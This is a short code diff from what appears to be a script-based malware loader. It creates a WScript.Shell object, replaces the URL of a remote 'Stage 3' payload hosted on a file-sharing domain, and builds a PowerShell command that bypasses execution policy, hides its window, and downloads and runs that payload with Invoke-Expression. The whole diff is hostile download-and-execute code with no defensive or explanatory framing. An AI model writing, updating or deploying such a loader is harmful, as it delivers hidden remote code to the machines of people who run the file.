@@ -7,7 +7,7 @@
         var wsh = new ActiveXObject("WScript.Shell");
 
         // Your working Stage 3 URL
-        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_2b6660a32b634833824622b593599ef4.txt";
+        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_4f21a301d24a4aab93e4c4a930cb1ce4.txt";
 
         // More reliable way to run Stage 3
         var stage3Cmd = '-ep Bypass -WindowStyle Hidden -c "powershell -c \\"Invoke-Expression (irm \'' + stage3Url + '\')\\""';
